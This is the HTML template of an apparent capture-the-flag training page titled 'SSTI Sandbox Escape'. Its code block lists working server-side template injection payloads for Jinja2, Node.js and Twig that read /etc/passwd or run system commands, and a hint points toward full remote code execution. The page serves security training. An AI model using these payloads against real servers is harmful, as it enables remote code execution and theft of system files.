<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title><%= title %> - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
<body>
  <div class="matrix-bg"></div>
  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a></div></nav>
  <div class="lab-container">
    <div class="lab-header"><h1>🧪 SSTI Sandbox Escape</h1><div class="lab-info"><span class="lab-tag difficulty-hard">Hard</span></div></div>
    <div class="lab-section"><h2><i class="fas fa-crosshairs"></i> Objective</h2><p>The template engine runs in a restricted sandbox. Escape it using MRO chains, constructor access, or prototype traversal to reach dangerous functions.</p></div>
    <div class="lab-section"><h2><i class="fas fa-terminal"></i> Sandbox</h2>
      <div class="code-block">Python Jinja2 sandbox escape chain:
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

Node.js sandbox escape:
constructor.constructor('return process')().mainModule.require('child_process').execSync('id')

Twig (PHP):
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</div>
      <div class="hint-box"><i class="fas fa-lightbulb"></i> Combine basic SSTI detection with sandbox escape techniques for full RCE</div>
    </div>
    <div class="flag-submit"><h3><i class="fas fa-flag"></i> Capture The Flag</h3>
      <form onsubmit="submitFlagInline('ssti-basic','flagInput_ssti2','flagResult_ssti2'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;"><input type="text" id="flagInput_ssti2" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button></form>
      <div id="flagResult_ssti2" style="display:none; margin-top:1rem;"></div>
    </div>
  </div>
  <script src="/js/main.js"></script>
</body>
</html>
